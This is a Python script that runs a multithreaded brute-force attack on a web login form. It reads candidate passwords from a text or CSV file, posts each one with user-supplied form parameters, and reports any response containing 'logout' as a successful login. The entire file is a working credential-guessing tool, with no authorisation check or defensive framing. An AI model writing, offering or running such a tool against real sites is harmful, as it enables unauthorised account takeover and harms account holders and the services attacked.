import csv
from concurrent.futures import ThreadPoolExecutor
import requests

url = input("Give request url: ")
th = int(input("Give number of threads: "))
filename = input("Enter filename with passwords (.txt or .csv): ")

# Dynamic parameters collection
params = {}
print("Enter POST parameters (type 'done' when finished):")
while True:
    param_name = input("Parameter name: ").strip()
    if param_name.lower() == 'done':
        break
    param_value = input(f"Value for '{param_name}': ").strip()
    params[param_name] = param_value

print(f"Parameters: {params}")

session = requests.session()

def login(passwd):
    # Use dynamic parameters + password
    post_data = params.copy()
    post_data["parameter2"] = passwd  # Override password field
    
    out = session.post(url, data=post_data)
    if "logout" in out.content.decode():
        print("Logged in for password:", passwd)
        return True
    return False

# Read passwords (same as before)
passwords = []
if filename.endswith(".csv"):
    with open(filename, "r") as f:
        reader = csv.reader(f)
        for row in reader:
            for cell in row:
                for word in cell.split(","):
                    word = word.strip()
                    if word:
                        passwords.append(word)
else:
    with open(filename, "r") as f:
        for line in f:
            word = line.strip()
            if word:
                passwords.append(word)

with ThreadPoolExecutor(max_workers=th) as executor:
    futures = [executor.submit(login, pwd) for pwd in passwords]
    for future in futures:
        future.result()

print("Scan complete!")
